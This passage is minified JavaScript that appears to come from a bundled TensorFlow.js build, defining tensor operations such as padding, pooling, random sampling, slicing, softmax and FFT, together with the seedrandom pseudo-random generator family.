              , r = {
                axis: t,
                keepDims: e
            };
            return G.runKernel(Ya, o, r)
        }
    });
    function ge(n, t="float32") {
        if (es(n),
        "complex64" === t) {
            const s = ge(n, "float32")
              , o = ge(n, "float32");
            return Ko(s, o)
        }
        const e = ke(Z(n), t);
        return G.makeTensor(e, n, t)
    }
    function Ss(n, t="float32") {
        if (es(n),
        "complex64" === t) {
            const s = Ss(n, "float32")
              , o = ge(n, "float32");
            return Ko(s, o)
        }
        const e = jl(Z(n), t);
        return G.makeTensor(e, n, t)
    }
    const Gi = D({
        minimum_: function Zv(n, t) {
            let e = N(n, "a", "minimum")
              , s = N(t, "b", "minimum");
            [e,s] = te(e, s),
            "bool" === e.dtype && (e = st(e, "int32"),
            s = st(s, "int32")),
            gt(e.shape, s.shape);
            const o = {
                a: e,
                b: s
            };
            return G.runKernel(Qr, o)
        }
    });
    const Hv = D({
        mirrorPad_: function Bv(n, t, e) {
            v("reflect" === e || "symmetric" === e, (()=>`Invalid mode. Mode must be either reflect or symmetric. Got ${e}.`));
            const s = N(n, "x", "mirrorPad");
            if (0 === s.rank)
                throw new Error("mirrorPad(scalar) is not defined. Pass non-scalar to mirrorPad");
            v(t.length === s.rank, (()=>`Padding doesn't match input. Must be ${s.rank}. Got ${t.length}.`));
            const o = "reflect" === e ? 1 : 0;
            for (let a = 0; a < s.rank; a++)
                v(2 === t[a].length, (()=>"Invalid number of paddings. Must be length of 2 each.")),
                v(t[a][0] >= 0 && t[a][0] <= s.shape[a] - o && t[a][1] >= 0 && t[a][1] <= s.shape[a] - o, (()=>`Padding in dimension ${a} cannot be greater than or equal to ${s.shape[a] - o} or less than 0 for input of shape ${s.shape}`));
            const r = {
                paddings: t,
                mode: e
            }
              , i = {
                x: s
            };
            return G.runKernel(Ja, i, r)
        }
    });
    const Uv = D({
        mod_: function _v(n, t) {
            let e = N(n, "a", "mod")
              , s = N(t, "b", "mod");
            [e,s] = te(e, s);
            const o = {
                a: e,
                b: s
            };
            return G.runKernel(Jr, o)
        }
    });
    const kd = D({
        moments_: function Yv(n, t=null, e=!1) {
            const s = It(t, (n = N(n, "x", "moments")).shape)
              , o = ie(n, s, e);
            let r = o.shape;
            e || (r = re(o.shape, s));
            const i = Bt(pt(st(n, "float32"), W(o, r)));
            return {
                mean: o,
                variance: ie(i, s, e)
            }
        }
    });
    const Mc = D({
        notEqual_: function Qv(n, t) {
            let e = N(n, "a", "notEqual", "string_or_numeric")
              , s = N(t, "b", "notEqual", "string_or_numeric");
            [e,s] = te(e, s),
            gt(e.shape, s.shape);
            const o = {
                a: e,
                b: s
            };
            return G.runKernel(qa, o)
        }
    });
    const Zm = D({
        oneHot_: function Jv(n, t, e=1, s=0, o="int32") {
            if (t < 2)
                throw new Error(`Error in oneHot: depth must be >=2, but it is ${t}`);
            const i = {
                indices: N(n, "indices", "oneHot", "int32")
            }
              , a = {
                dtype: o,
                depth: t,
                onValue: e,
                offValue: s
            };
            return G.runKernel(ec, i, a)
        }
    });
    const fn = D({
        onesLike_: function jv(n) {
            const e = {
                x: N(n, "x", "onesLike")
            };
            return G.runKernel(tc, e)
        }
    });
    const Td = D({
        pad_: function qv(n, t, e=0) {
            const s = N(n, "x", "pad");
            if (0 === s.rank)
                throw new Error("pad(scalar) is not defined. Pass non-scalar to pad");
            const o = {
                paddings: t,
                constantValue: e
            }
              , r = {
                x: s
            };
            return G.runKernel(sc, r, o)
        }
    });
    const Nd = D({
        spaceToBatchND_: function tS(n, t, e) {
            const s = N(n, "x", "spaceToBatchND");
            v(s.rank >= 1 + t.length, (()=>`input rank ${s.rank} should be > than [blockShape] ${t.length}`)),
            v(e.length === t.length, (()=>`paddings.shape[0] ${e.length} must be equal to [blockShape] ${t.length}`)),
            v(s.shape.reduce(((i,a,c)=>c > 0 && c <= t.length ? i && (a + e[c - 1][0] + e[c - 1][1]) % t[c - 1] == 0 : i), !0), (()=>`input spatial dimensions ${s.shape.slice(1)} with paddings ${e.toString()} must be divisible by blockShapes ${t.toString()}`));
            const o = {
                x: s
            }
              , r = {
                blockShape: t,
                paddings: e
            };
            return G.runKernel(pc, o, r)
        }
    });
    const oS = D({
        pool_: function eS(n, t, e, s, o, r, i) {
            null == o && (o = [1, 1]),
            null == r && (r = 1),
            0 === s && (s = "valid");
            const a = N(n, "x", "maxPool");
            let c = a
              , l = !1;
            3 === a.rank && (l = !0,
            c = W(a, [1, a.shape[0], a.shape[1], a.shape[2]])),
            v(Te(r, o), (()=>`Error in pool: Either strides or dilations must be 1. Got strides ${r} and dilations '${o}'`));
            const u = pn(c.shape, t, r, o, s)
              , d = [u.dilationHeight, u.dilationWidth];
            let h;
            h = "same" === s ? function sS(n, t) {
                const s = n.map(((i,a)=>i + (i - 1) * (t[a] - 1))).map((i=>i - 1))
                  , o = s.map((i=>Math.floor(i / 2)))
                  , r = s.map(((i,a)=>i - o[a]));
                return s.map(((i,a)=>[o[a], r[a]]))
            }([u.filterHeight, u.filterWidth], d) : [[0, 0], [0, 0]];
            const p = 1 === d[0] && 1 === d[1]
              , [f,m] = function nS(n, t, e) {
                const s = e.map((u=>u[0]))
                  , o = e.map((u=>u[1]))
                  , r = n.concat(s, o)
                  , i = t.map(((u,d)=>(u - r[d] % u) % u))
                  , a = o.map(((u,d)=>u + i[d]))
                  , c = t.map(((u,d)=>[s[d], a[d]]))
                  , l = t.map(((u,d)=>[0, i[d]]));
                return [c, l]
            }([u.inHeight, u.inWidth], d, h)
              , g = p ? s : "valid"
              , b = p ? c : Nd(c, d, f)
              , I = ("avg" === e ? ()=>hd(b, t, r, g, i) : ()=>Sd(b, t, r, g, i))()
              , y = p ? I : fd(I, d, m);
            return l ? W(y, [y.shape[1], y.shape[2], y.shape[3]]) : y
        }
    });
    const Rd = D({
        prelu_: function rS(n, t) {
            const o = {
                x: N(n, "x", "prelu"),
                alpha: N(t, "alpha", "prelu")
            };
            return G.runKernel(oc, o)
        }
    });
    const aS = D({
        prod_: function iS(n, t=null, e=!1) {
            let s = N(n, "x", "prod");
            "bool" === s.dtype && (s = st(s, "int32"));
            const o = {
                x: s
            }
              , r = {
                axis: t,
                keepDims: e
            };
            return G.runKernel(rc, o, r)
        }
    });
    var $d = {
        exports: {}
    };
    !function(n) {
        !function(t, e, s) {
            function o(c) {
                var l = this
                  , u = function a() {
                    var c = 4022871197
                      , l = function(u) {
                        u = String(u);
                        for (var d = 0; d < u.length; d++) {
                            var h = .02519603282416938 * (c += u.charCodeAt(d));
                            h -= c = h >>> 0,
                            c = (h *= c) >>> 0,
                            c += 4294967296 * (h -= c)
                        }
                        return 2.3283064365386963e-10 * (c >>> 0)
                    };
                    return l
                }();
                l.next = function() {
                    var d = 2091639 * l.s0 + 2.3283064365386963e-10 * l.c;
                    return l.s0 = l.s1,
                    l.s1 = l.s2,
                    l.s2 = d - (l.c = 0 | d)
                }
                ,
                l.c = 1,
                l.s0 = u(" "),
                l.s1 = u(" "),
                l.s2 = u(" "),
                l.s0 -= u(c),
                l.s0 < 0 && (l.s0 += 1),
                l.s1 -= u(c),
                l.s1 < 0 && (l.s1 += 1),
                l.s2 -= u(c),
                l.s2 < 0 && (l.s2 += 1),
                u = null
            }
            function r(c, l) {
                return l.c = c.c,
                l.s0 = c.s0,
                l.s1 = c.s1,
                l.s2 = c.s2,
                l
            }
            function i(c, l) {
                var u = new o(c)
                  , d = l && l.state
                  , h = u.next;
                return h.int32 = function() {
                    return 4294967296 * u.next() | 0
                }
                ,
                h.double = function() {
                    return h() + 11102230246251565e-32 * (2097152 * h() | 0)
                }
                ,
                h.quick = h,
                d && ("object" == typeof d && r(d, u),
                h.state = function() {
                    return r(u, {})
                }
                ),
                h
            }
            e && e.exports ? e.exports = i : this.alea = i
        }(0, n)
    }($d);
    var cS = $d.exports
      , Gd = {
        exports: {}
    };
    !function(n) {
        !function(t, e, s) {
            function o(a) {
                var c = this
                  , l = "";
                c.x = 0,
                c.y = 0,
                c.z = 0,
                c.w = 0,
                c.next = function() {
                    var d = c.x ^ c.x << 11;
                    return c.x = c.y,
                    c.y = c.z,
                    c.z = c.w,
                    c.w ^= c.w >>> 19 ^ d ^ d >>> 8
                }
                ,
                a === (0 | a) ? c.x = a : l += a;
                for (var u = 0; u < l.length + 64; u++)
                    c.x ^= 0 | l.charCodeAt(u),
                    c.next()
            }
            function r(a, c) {
                return c.x = a.x,
                c.y = a.y,
                c.z = a.z,
                c.w = a.w,
                c
            }
            function i(a, c) {
                var l = new o(a)
                  , u = c && c.state
                  , d = function() {
                    return (l.next() >>> 0) / 4294967296
                };
                return d.double = function() {
                    do {
                        var f = ((l.next() >>> 11) + (l.next() >>> 0) / 4294967296) / (1 << 21)
                    } while (0 === f);
                    return f
                }
                ,
                d.int32 = l.next,
                d.quick = d,
                u && ("object" == typeof u && r(u, l),
                d.state = function() {
                    return r(l, {})
                }
                ),
                d
            }
            e && e.exports ? e.exports = i : this.xor128 = i
        }(0, n)
    }(Gd);
    var lS = Gd.exports
      , Ld = {
        exports: {}
    };
    !function(n) {
        !function(t, e, s) {
            function o(a) {
                var c = this
                  , l = "";
                c.next = function() {
                    var d = c.x ^ c.x >>> 2;
                    return c.x = c.y,
                    c.y = c.z,
                    c.z = c.w,
                    c.w = c.v,
                    (c.d = c.d + 362437 | 0) + (c.v = c.v ^ c.v << 4 ^ d ^ d << 1) | 0
                }
                ,
                c.x = 0,
                c.y = 0,
                c.z = 0,
                c.w = 0,
                c.v = 0,
                a === (0 | a) ? c.x = a : l += a;
                for (var u = 0; u < l.length + 64; u++)
                    c.x ^= 0 | l.charCodeAt(u),
                    u == l.length && (c.d = c.x << 10 ^ c.x >>> 4),
                    c.next()
            }
            function r(a, c) {
                return c.x = a.x,
                c.y = a.y,
                c.z = a.z,
                c.w = a.w,
                c.v = a.v,
                c.d = a.d,
                c
            }
            function i(a, c) {
                var l = new o(a)
                  , u = c && c.state
                  , d = function() {
                    return (l.next() >>> 0) / 4294967296
                };
                return d.double = function() {
                    do {
                        var f = ((l.next() >>> 11) + (l.next() >>> 0) / 4294967296) / (1 << 21)
                    } while (0 === f);
                    return f
                }
                ,
                d.int32 = l.next,
                d.quick = d,
                u && ("object" == typeof u && r(u, l),
                d.state = function() {
                    return r(l, {})
                }
                ),
                d
            }
            e && e.exports ? e.exports = i : this.xorwow = i
        }(0, n)
    }(Ld);
    var uS = Ld.exports
      , Ed = {
        exports: {}
    };
    !function(n) {
        !function(t, e, s) {
            function o(a) {
                var c = this;
                c.next = function() {
                    var h, p, u = c.x, d = c.i;
                    return h = u[d],
                    p = (h ^= h >>> 7) ^ h << 24,
                    p ^= (h = u[d + 1 & 7]) ^ h >>> 10,
                    p ^= (h = u[d + 3 & 7]) ^ h >>> 3,
                    p ^= (h = u[d + 4 & 7]) ^ h << 7,
                    h = u[d + 7 & 7],
                    p ^= (h ^= h << 13) ^ h << 9,
                    u[d] = p,
                    c.i = d + 1 & 7,
                    p
                }
                ,
                function l(u, d) {
                    var h, p = [];
                    if (d === (0 | d))
                        p[0] = d;
                    else
                        for (d = "" + d,
                        h = 0; h < d.length; ++h)
                            p[7 & h] = p[7 & h] << 15 ^ d.charCodeAt(h) + p[h + 1 & 7] << 13;
                    for (; p.length < 8; )
                        p.push(0);
                    for (h = 0; h < 8 && 0 === p[h]; ++h)
                        ;
                    for (8 == h ? p[7] = -1 : p[h],
                    u.x = p,
                    u.i = 0,
                    h = 256; h > 0; --h)
                        u.next()
                }(c, a)
            }
            function r(a, c) {
                return c.x = a.x.slice(),
                c.i = a.i,
                c
            }
            function i(a, c) {
                null == a && (a = +new Date);
                var l = new o(a)
                  , u = c && c.state
                  , d = function() {
                    return (l.next() >>> 0) / 4294967296
                };
                return d.double = function() {
                    do {
                        var f = ((l.next() >>> 11) + (l.next() >>> 0) / 4294967296) / (1 << 21)
                    } while (0 === f);
                    return f
                }
                ,
                d.int32 = l.next,
                d.quick = d,
                u && (u.x && r(u, l),
                d.state = function() {
                    return r(l, {})
                }
                ),
                d
            }
            e && e.exports ? e.exports = i : this.xorshift7 = i
        }(0, n)
    }(Ed);
    var dS = Ed.exports
      , Dd = {
        exports: {}
    };
    !function(n) {
        !function(t, e, s) {
            function o(a) {
                var c = this;
                c.next = function() {
                    var p, f, u = c.w, d = c.X, h = c.i;
                    return c.w = u = u + 1640531527 | 0,
                    f = d[h + 34 & 127],
                    p = d[h = h + 1 & 127],
                    f ^= f << 13,
                    p ^= p << 17,
                    f ^= f >>> 15,
                    p ^= p >>> 12,
                    f = d[h] = f ^ p,
                    c.i = h,
                    f + (u ^ u >>> 16) | 0
                }
                ,
                function l(u, d) {
                    var h, p, f, m, g, b = [], x = 128;
                    for (d === (0 | d) ? (p = d,
                    d = null) : (d += "\0",
                    p = 0,
                    x = Math.max(x, d.length)),
                    f = 0,
                    m = -32; m < x; ++m)
                        d && (p ^= d.charCodeAt((m + 32) % d.length)),
                        0 === m && (g = p),
                        p ^= p << 10,
                        p ^= p >>> 15,
                        p ^= p << 4,
                        p ^= p >>> 13,
                        m >= 0 && (g = g + 1640531527 | 0,
                        f = 0 == (h = b[127 & m] ^= p + g) ? f + 1 : 0);
                    for (f >= 128 && (b[127 & (d && d.length || 0)] = -1),
                    f = 127,
                    m = 512; m > 0; --m)
                        p = b[f + 34 & 127],
                        h = b[f = f + 1 & 127],
                        p ^= p << 13,
                        h ^= h << 17,
                        p ^= p >>> 15,
                        h ^= h >>> 12,
                        b[f] = p ^ h;
                    u.w = g,
                    u.X = b,
                    u.i = f
                }(c, a)
            }
            function r(a, c) {
                return c.i = a.i,
                c.w = a.w,
                c.X = a.X.slice(),
                c
            }
            function i(a, c) {
                null == a && (a = +new Date);
                var l = new o(a)
                  , u = c && c.state
                  , d = function() {
                    return (l.next() >>> 0) / 4294967296
                };
                return d.double = function() {
                    do {
                        var f = ((l.next() >>> 11) + (l.next() >>> 0) / 4294967296) / (1 << 21)
                    } while (0 === f);
                    return f
                }
                ,
                d.int32 = l.next,
                d.quick = d,
                u && (u.X && r(u, l),
                d.state = function() {
                    return r(l, {})
                }
                ),
                d
            }
            e && e.exports ? e.exports = i : this.xor4096 = i
        }(0, n)
    }(Dd);
    var hS = Dd.exports
      , Wd = {
        exports: {}
    };
    !function(n) {
        !function(t, e, s) {
            function o(a) {
                var c = this
                  , l = "";
                c.next = function() {
                    var d = c.b
                      , h = c.c
                      , p = c.d
                      , f = c.a;
                    return d = d << 25 ^ d >>> 7 ^ h,
                    h = h - p | 0,
                    p = p << 24 ^ p >>> 8 ^ f,
                    f = f - d | 0,
                    c.b = d = d << 20 ^ d >>> 12 ^ h,
                    c.c = h = h - p | 0,
                    c.d = p << 16 ^ h >>> 16 ^ f,
                    c.a = f - d | 0
                }
                ,
                c.a = 0,
                c.b = 0,
                c.c = -1640531527,
                c.d = 1367130551,
                a === Math.floor(a) ? (c.a = a / 4294967296 | 0,
                c.b = 0 | a) : l += a;
                for (var u = 0; u < l.length + 20; u++)
                    c.b ^= 0 | l.charCodeAt(u),
                    c.next()
            }
            function r(a, c) {
                return c.a = a.a,
                c.b = a.b,
                c.c = a.c,
                c.d = a.d,
                c
            }
            function i(a, c) {
                var l = new o(a)
                  , u = c && c.state
                  , d = function() {
                    return (l.next() >>> 0) / 4294967296
                };
                return d.double = function() {
                    do {
                        var f = ((l.next() >>> 11) + (l.next() >>> 0) / 4294967296) / (1 << 21)
                    } while (0 === f);
                    return f
                }
                ,
                d.int32 = l.next,
                d.quick = d,
                u && ("object" == typeof u && r(u, l),
                d.state = function() {
                    return r(l, {})
                }
                ),
                d
            }
            e && e.exports ? e.exports = i : this.tychei = i
        }(0, n)
    }(Wd);
    var pS = Wd.exports
      , Bm = {
        exports: {}
    };
    const fS = function bw(n) {
        if (n.__esModule)
            return n;
        var t = n.default;
        if ("function" == typeof t) {
            var e = function s() {
                return this instanceof s ? Reflect.construct(t, arguments, this.constructor) : t.apply(this, arguments)
            };
            e.prototype = t.prototype
        } else
            e = {};
        return Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        Object.keys(n).forEach((function(s) {
            var o = Object.getOwnPropertyDescriptor(n, s);
            Object.defineProperty(e, s, o.get ? o : {
                enumerable: !0,
                get: function() {
                    return n[s]
                }
            })
        }
        )),
        e
    }(Object.freeze(Object.defineProperty({
        __proto__: null,
        default: {}
    }, Symbol.toStringTag, {
        value: "Module"
    })));
    !function(n) {
        !function(t, e, s) {
            var h, o = 256, a = "random", c = s.pow(o, 6), l = s.pow(2, 52), u = 2 * l, d = o - 1;
            function p(y, w, C) {
                var k = []
                  , S = b(g((w = 1 == w ? {
                    entropy: !0
                } : w || {}).entropy ? [y, I(e)] : y ?? function x() {
                    try {
                        var y;
                        return h && (y = h.randomBytes) ? y = y(o) : (y = new Uint8Array(o),
                        (t.crypto || t.msCrypto).getRandomValues(y)),
                        I(y)
                    } catch {
                        var w = t.navigator
                          , C = w && w.plugins;
                        return [+new Date, t, C, t.screen, I(e)]
                    }
                }(), 3), k)
                  , T = new f(k)
                  , R = function() {
                    for (var L = T.g(6), V = c, F = 0; L < l; )
                        L = (L + F) * o,
                        V *= o,
                        F = T.g(1);
                    for (; L >= u; )
                        L /= 2,
                        V /= 2,
                        F >>>= 1;
                    return (L + F) / V
                };
                return R.int32 = function() {
                    return 0 | T.g(4)
                }
                ,
                R.quick = function() {
                    return T.g(4) / 4294967296
                }
                ,
                R.double = R,
                b(I(T.S), e),
                (w.pass || C || function(L, V, F, X) {
                    return X && (X.S && m(X, T),
                    L.state = function() {
                        return m(T, {})
                    }
                    ),
                    F ? (s[a] = L,
                    V) : L
                }
                )(R, S, "global"in w ? w.global : this == s, w.state)
            }
            function f(y) {
                var w, C = y.length, k = this, S = 0, T = k.i = k.j = 0, R = k.S = [];
                for (C || (y = [C++]); S < o; )
                    R[S] = S++;
                for (S = 0; S < o; S++)
                    R[S] = R[T = d & T + y[S % C] + (w = R[S])],
                    R[T] = w;
                (k.g = function(L) {
                    for (var V, F = 0, X = k.i, A = k.j, P = k.S; L--; )
                        V = P[X = d & X + 1],
                        F = F * o + P[d & (P[X] = P[A = d & A + V]) + (P[A] = V)];
                    return k.i = X,
                    k.j = A,
                    F
                }
                )(o)
            }
            function m(y, w) {
                return w.i = y.i,
                w.j = y.j,
                w.S = y.S.slice(),
                w
            }
            function g(y, w) {
                var S, C = [], k = typeof y;
                if (w && "object" == k)
                    for (S in y)
                        try {
                            C.push(g(y[S], w - 1))
                        } catch {}
                return C.length ? C : "string" == k ? y : y + "\0"
            }
            function b(y, w) {
                for (var k, C = y + "", S = 0; S < C.length; )
                    w[d & S] = d & (k ^= 19 * w[d & S]) + C.charCodeAt(S++);
                return I(w)
            }
            function I(y) {
                return String.fromCharCode.apply(0, y)
            }
            if (b(s.random(), e),
            n.exports) {
                n.exports = p;
                try {
                    h = fS
                } catch {}
            } else
                s["seed" + a] = p
        }(typeof self < "u" ? self : Zs, [], Math)
    }(Bm);
    var gS = cS
      , bS = lS
      , xS = uS
      , yS = dS
      , IS = hS
      , wS = pS
      , ro = Bm.exports;
    ro.alea = gS,
    ro.xor128 = bS,
    ro.xorwow = xS,
    ro.xorshift7 = yS,
    ro.xor4096 = IS,
    ro.tychei = wS;
    var Md = ro;
    class Hm {
        constructor(t, e, s, o, r) {
            this.mean = t,
            this.stdDev = e,
            this.dtype = s,
            this.nextVal = NaN,
            this.truncated = o,
            this.truncated && (this.upper = this.mean + 2 * this.stdDev,
            this.lower = this.mean - 2 * this.stdDev);
            const i = r || Math.random();
            this.random = Md.alea(i.toString())
        }
        nextValue() {
            if (!isNaN(this.nextVal)) {
                const o = this.nextVal;
                return this.nextVal = NaN,
                o
            }
            let t, e, s = !1;
            for (; !s; ) {
                let o, r, i;
                do {
                    o = 2 * this.random() - 1,
                    r = 2 * this.random() - 1,
                    i = o * o + r * r
                } while (i >= 1 || 0 === i);
                const a = Math.sqrt(-2 * Math.log(i) / i);
                t = this.mean + this.stdDev * o * a,
                e = this.mean + this.stdDev * r * a,
                (!this.truncated || this.isValidTruncated(t)) && (s = !0)
            }
            return (!this.truncated || this.isValidTruncated(e)) && (this.nextVal = this.convertValue(e)),
            this.convertValue(t)
        }
        convertValue(t) {
            return null == this.dtype || "float32" === this.dtype ? t : Math.round(t)
        }
        isValidTruncated(t) {
            return t <= this.upper && t >= this.lower
        }
    }
    class CS {
        constructor(t=0, e=1, s, o) {
            if (this.canReturnFloat = ()=>null == this.dtype || "float32" === this.dtype,
            this.min = t,
            this.range = e - t,
            this.dtype = s,
            null == o && (o = Math.random()),
            "number" == typeof o && (o = o.toString()),
            !this.canReturnFloat() && this.range <= 1)
                throw new Error(`The difference between ${t} - ${e} <= 1 and dtype is not float`);
            this.random = Md.alea(o)
        }
        convertValue(t) {
            return this.canReturnFloat() ? t : Math.round(t)
        }
        nextValue() {
            return this.convertValue(this.min + this.range * this.random())
        }
    }
    const SS = D({
        randomNormal_: function vS(n, t=0, e=1, s, o) {
            if (es(n),
            null != s && "bool" === s)
                throw new Error(`Unsupported data type ${s}`);
            const r = new Hm(t,e,s,!1,o)
              , i = wt(n, s);
            for (let a = 0; a < i.values.length; a++)
                i.values[a] = r.nextValue();
            return i.toTensor()
        }
    });
    const Li = D({
        randomUniform_: function kS(n, t=0, e=1, s="float32", o) {
            es(n);
            const r = wt(n, s)
              , i = new CS(t,e,null,o);
            for (let a = 0; a < r.values.length; a++)
                r.values[a] = i.nextValue();
            return r.toTensor()
        }
    });
    function Ei(n, t, e=1, s="float32") {
        if (0 === e)
            throw new Error("Cannot have a step of zero");
        const o = {
            start: n,
            stop: t,
            step: e,
            dtype: s
        };
        return G.runKernel(Wu, {}, o)
    }
    const Vc = D({
        real_: function TS(n) {
            const e = {
                input: N(n, "input", "real")
            };
            return G.runKernel(Mu, e)
        }
    });
    const RS = D({
        reciprocal_: function NS(n) {
            const e = {
                x: N(n, "x", "reciprocal")
            };
            return G.runKernel(ti, e)
        }
    });
    const io = D({
        relu_: function $S(n) {
            const e = {
                x: N(n, "x", "relu")
            };
            return G.runKernel(ei, e)
        }
    });
    const _m = D({
        relu6_: function GS(n) {
            const e = {
                x: N(n, "x", "relu6")
            };
            return G.runKernel(ni, e)
        }
    });
    const ao = D({
        reverse_: function LS(n, t) {
            const s = {
                x: N(n, "x", "reverse")
            }
              , o = {
                dims: t
            };
            return G.runKernel(lc, s, o)
        }
    });
    const Um = D({
        round_: function ES(n) {
            const e = {
                x: N(n, "x", "round")
            };
            return G.runKernel(si, e)
        }
    });
    const Ym = D({
        rsqrt_: function DS(n) {
            const e = {
                x: N(n, "x", "rsqrt", "float32")
            };
            return G.runKernel(oi, e)
        }
    });
    const Qm = D({
        selu_: function WS(n) {
            const e = {
                x: N(n, "x", "selu")
            };
            return G.runKernel(ri, e)
        }
    });
    const Jm = D({
        separableConv2d_: function MS(n, t, e, s, o, r=[1, 1], i="NHWC") {
            const a = N(n, "x", "separableConv2d")
              , c = N(t, "depthwiseFilter", "separableConv2d")
              , l = N(e, "pointwiseFilter", "separableConv2d");
            let u = a
              , d = !1;
            if (3 === a.rank && (d = !0,
            u = W(a, [1, a.shape[0], a.shape[1], a.shape[2]])),
            "NCHW" === i)
                throw new Error("separableConv2d currently does not support dataFormat NCHW; only NHWC is supported");
            v(4 === u.rank, (()=>`Error in separableConv2d: input must be rank 4, but got rank ${u.rank}.`)),
            v(4 === c.rank, (()=>`Error in separableConv2d: depthwise filter must be rank 4, but got rank ${c.rank}.`)),
            v(4 === l.rank, (()=>`Error in separableConv2d: pointwise filter must be rank 4, but got rank ${c.rank}.`)),
            v(1 === l.shape[0], (()=>`Error in separableConv2d: the first dimension of pointwise filter  must be 1, but got ${l.shape[0]}.`)),
            v(1 === l.shape[1], (()=>`Error in separableConv2d: the second dimension of pointwise filter must be 1, but got ${l.shape[1]}.`));
            const h = c.shape[2]
              , p = c.shape[3];
            v(l.shape[2] === h * p, (()=>`Error in separableConv2d: the third dimension of pointwise filter must be ${h * p}, but got ${l.shape[2]}.`));
            const f = xd(u, c, s, o, i, r)
              , g = so(f, l, 1, "valid", i);
            return d ? W(g, [g.shape[1], g.shape[2], g.shape[3]]) : g
        }
    });
    const FS = D({
        sign_: function VS(n) {
            const e = {
                x: N(n, "x", "sign")
            };
            return G.runKernel(ci, e)
        }
    });
    const jm = D({
        sin_: function zS(n) {
            const e = {
                x: N(n, "x", "sin", "float32")
            };
            return G.runKernel(ii, e)
        }
    });
    const qm = D({
        sinh_: function XS(n) {
            const e = {
                x: N(n, "x", "sinh")
            };
            return G.runKernel(ai, e)
        }
    });
    const Vd = D({
        slice1d_: function AS(n, t, e) {
            const s = N(n, "x", "slice1d");
            return v(1 === s.rank, (()=>`slice1d expects a rank-1 tensor, but got a rank-${s.rank} tensor`)),
            Xt(s, [t], [e])
        }
    });
    const tg = D({
        slice2d_: function PS(n, t, e) {
            const s = N(n, "x", "slice2d");
            return v(2 === s.rank, (()=>`slice2d expects a rank-2 tensor, but got a rank-${s.rank} tensor`)),
            Xt(s, t, e)
        }
    });
    const Fd = D({
        slice3d_: function OS(n, t, e) {
            const s = N(n, "x", "slice3d");
            return v(3 === s.rank, (()=>`slice3d expects a rank-3 tensor, but got a rank-${s.rank} tensor`)),
            Xt(s, t, e)
        }
    });
    const Fc = D({
        slice4d_: function KS(n, t, e) {
            const s = N(n, "x", "slice4d");
            return v(4 === s.rank, (()=>`slice4d expects a rank-4 tensor, but got a rank-${s.rank} tensor`)),
            Xt(s, t, e)
        }
    });
    const zd = D({
        softmax_: function ZS(n, t=-1) {
            const e = N(n, "logits", "softmax", "float32");
            if (-1 === t && (t = e.rank - 1),
            t !== e.rank - 1)
                throw Error(`Softmax along a non-last dimension is not yet supported. Logits was rank ${e.rank} and dim was ${t}`);
            const s = {
                logits: e
            }
              , o = {
                dim: t
            };
            return G.runKernel(mc, s, o)
        }
    });
    const eg = D({
        fft_: function BS(n) {
            v("complex64" === n.dtype, (()=>`The dtype for tf.spectral.fft() must be complex64 but got ${n.dtype}.`));
            const t = {
                input: n
            };
            return G.runKernel("FFT", t)
        }
    });
    const Xd = D({
        ifft_: function HS(n) {
            v("complex64" === n.dtype, (()=>`The dtype for tf.spectral.ifft() must be complex64 but got ${n.dtype}.`));
            const t = {
                input: n
            };
            return G.runKernel(Tu, t)
        }
    });
    const US = D({
        irfft_: function _S(n) {
            const t = n.shape[n.shape.length - 1]
              , e = n.size / t;
            let s;
            if (t <= 2) {
                const o = W(n, [e, t]);
                s = Xd(o)
            } else {
                const o = [e, 2 * (t - 1)]
                  , r = W(Vc(n), [e, t])
                  , i = W(wd(n), [e, t])
                  , a = ao(Xt(r, [0, 1], [e, t - 2]), 1)
                  , c = E(ao(Xt(i, [0, 1], [e, t - 2]), 1), Gt(-1))
                  , l = Xe([r, a], 1)
                  , u = Xe([i, c], 1)
                  , d = W(Ko(l, u), [o[0], o[1]]);
                s = Xd(d)
            }
            if (s = Vc(s),
            3 === n.rank && 0 !== n.shape[0]) {
                const o = s
                  , r = n.shape[0];
                s = W(s, [r, s.shape[0] / r, s.shape[1]]),
                o.dispose()
            }
            return s
        }
    });
    const on = D({
        split_: function YS(n, t, e=0) {
            const o = {
                x: N(n, "x", "split")
            }
              , r = {
                numOrSizeSplits: t,
                axis: e
            };
            return G.runKernel(fc, o, r)
        }
    });
    const JS = D({
        rfft_: function QS(n, t) {
            v("float32" === n.dtype, (()=>`The dtype for rfft() must be real value but got ${n.dtype}`));
            let e = n.shape[n.shape.length - 1];
            const s = n.size / e;
            let o;
            if (null != t && t < e) {
                const f = n.shape.map((g=>0))
                  , m = n.shape.map((g=>g));
                m[n.shape.length - 1] = t,
                o = Xt(n, f, m),
                e = t
            } else if (null != t && t > e) {
                const f = n.shape.map((m=>m));
                f[n.shape.length - 1] = t - e,
                o = Xe([n, ge(f)], n.shape.length - 1),
                e = t
            } else
                o = n;
            const r = St(o)
              , i = W(Ko(o, r), [s, e])
              , a = eg(i)
              , c = Math.floor(e / 2) + 1
              , l = Vc(a)
              , u = wd(a)
              , d = on(l, [c, e - c], l.shape.length - 1)
              , h = on(u, [c, e - c], u.shape.length - 1)
              , p = o.shape.slice();
            return p[o.shape.length - 1] = c,
            W(Ko(d[0], h[0]), p)
        }
    });
    const qS = D({
        squaredDifference_: function jS(n, t) {
            let e = N(n, "a", "squaredDifference")
              , s = N(t, "b", "squaredDifference");
            [e,s] = te(e, s),
            gt(e.shape, s.shape);
            const o = {
                a: e,
                b: s
            };
            return G.runKernel(hi, o, {})
        }
    });
    const Di = D({
        squeeze_: function tk(n, t) {
            const e = N(n, "x", "squeeze", "string_or_numeric");
            return W(e, fs(e.shape, t).newShape)
        }
    });
    const On = D({
        stack_: function ek(n, t=0) {
            const e = gm(n, "tensors", "stack", "string_or_numeric");
            v(e.length >= 1, (()=>"Pass at least one tensor to tf.stack")),
            e.length > 0 && v(t <= e[0].rank, (()=>"Axis must be <= rank of the tensor"));
            const s = e
              , o = {
                axis: t
            };
            return G.runKernel(nc, s, o)
        }
    });
    const Wi = D({
        step_: function nk(n, t=0) {
            const s = {
                x: N(n, "x", "step")
            }
              , o = {
                alpha: t
            };
            return G.runKernel(bi, s, o)
        }
    });
    const ok = D({
        stridedSlice_: function sk(n, t, e, s, o=0, r=0, i=0, a=0, c=0) {
            const u = {
                x: N(n, "x", "stridedSlice", "string_or_numeric")
            }
              , d = {
                begin: t,
                end: e,
                strides: s,
                beginMask: o,
                endMask: r,
                ellipsisMask: i,
                newAxisMask: a,
                shrinkAxisMask: c
            };
            return G.runKernel(Au, u, d)
        }
    });
    const ik = D({
        tan_: function rk(n) {
            const e = {
                x: N(n, "x", "tan", "float32")
            };
            return G.runKernel(fi, e)
        }
    });
    function Ue(n, t) {
